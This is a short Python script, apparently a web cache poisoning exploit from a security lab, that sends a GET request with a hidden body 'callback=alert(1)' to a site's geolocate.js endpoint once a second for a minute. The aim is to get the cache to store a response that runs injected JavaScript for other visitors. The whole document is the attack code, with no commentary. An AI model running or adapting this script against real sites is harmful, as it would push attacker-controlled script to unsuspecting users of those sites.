import time
import sys
import http.client
import urllib.parse

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    path = "/js/geolocate.js?callback=setCountryCookie"

    parsed_url = urllib.parse.urlparse(base_url)
    host = parsed_url.netloc

    burp_data = "callback=alert(1)"

    print("wait 60sek")
    for _ in range(60):
        conn = http.client.HTTPSConnection(host)

        conn.request("GET", path, body=burp_data, headers={
            "Content-Length": str(len(burp_data)),
            "Host": host,
        })

        response = conn.getresponse()

        data = response.read()

        conn.close()

        time.sleep(1)
